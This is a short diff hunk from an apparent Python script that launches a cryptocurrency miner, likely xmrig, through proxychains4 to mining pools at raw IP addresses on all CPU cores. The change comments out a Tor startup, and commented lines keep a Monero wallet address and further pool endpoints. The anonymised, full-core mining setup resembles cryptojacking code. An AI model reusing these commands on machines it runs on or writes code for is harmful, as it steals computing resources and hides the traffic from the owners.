@@ -40,7 +40,7 @@ except:
     pass
 #os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
 #os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
-os.system('tor &')
-time.sleep(60)
+#os.system('tor &')
+#time.sleep(60)
 os.system ('proxychains4 ' + program + ' -o stratum+tcp://66.42.53.57:442 --tls -t ' + str(cores))
 #os.system ('proxychains4 ' + program + ' --donate-level 1 -o stratum+tcp://66.42.93.164:442 --tls -t ' + str(cores))
